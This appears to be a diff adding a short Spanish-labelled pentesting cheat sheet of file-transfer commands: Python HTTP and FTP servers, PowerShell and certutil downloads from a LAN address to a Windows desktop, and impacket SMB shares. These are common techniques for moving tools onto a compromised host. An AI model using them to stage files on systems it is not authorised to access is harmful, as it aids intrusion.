@@ -1,0 +1,18 @@
+
+# TRANSFERENCIA DE ARCHIVOS
+python -m SimpleHTTPServer 8000
+python3 -m http.server
+
+# VIA FTP
+sudo python -m pyftpdlib -p 21 -w
+
+#powershell
+powershell Invoke-WebRequest "http://192.168.0.109:8000/FILE" -OutFile "C:\Users\advance\Desktop\FILE"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.0.109:8000/FILE','C:\Users\advance\Desktop\FILE')"
+
+# CMD (PARA DESCARGAS)
+certutil.exe -f -urlcache -split http://192.168.0.109:8000/FILE FILE
+
+#samba
+impacket-smbserver shared `pwd`
+sudo impacket-smbserver -smb2support sharepath /tmp
